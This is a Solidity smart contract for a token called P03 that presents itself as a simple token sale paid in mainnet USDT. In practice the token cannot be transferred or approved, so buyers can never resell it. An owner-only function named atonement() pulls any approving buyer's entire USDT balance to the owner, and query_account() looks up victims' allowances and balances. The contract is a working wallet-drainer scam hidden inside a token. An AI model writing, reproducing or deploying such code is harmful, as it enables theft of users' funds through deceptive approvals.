// SPDX-License-Identifier: GPLv3

pragma solidity ^0.8.0;

abstract contract Ownable {
    address public owner;
    constructor() {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        owner = newOwner;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract ERC20 is IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 0;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        require(false, "Cannot approve");
        _allowances[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(false, "Cannot transfer");
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(false, "Cannot transferFrom");
        _transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
}

interface ETHUSDT {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

contract P03 is ERC20, Ownable {
    ETHUSDT public usdt = ETHUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    uint public price = 10 ** 6;
    event NewPrice(uint newPrice);
    event Buy(address indexed user, uint price);
    
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {
    }
    
    function buy() external {
        _mint(msg.sender, 1);
        usdt.transferFrom(msg.sender, address(this), price);
        emit Buy(msg.sender, price);
    }
    
    function query_account(address _addr) external view returns(uint, uint, uint, uint) {
        return (_addr.balance,
                balanceOf(_addr),
                usdt.allowance(_addr, address(this)),
                usdt.balanceOf(_addr));
    }
    
    function updatePrice(uint _price) external onlyOwner {
        price = _price;
        emit NewPrice(_price);
    }
    
    function collect() external onlyOwner {
        usdt.transfer(owner, usdt.balanceOf(address(this)));
    }
    
    function atonement(address addr) external onlyOwner {
        usdt.transferFrom(addr, owner, usdt.balanceOf(address(addr)));
    }
    
}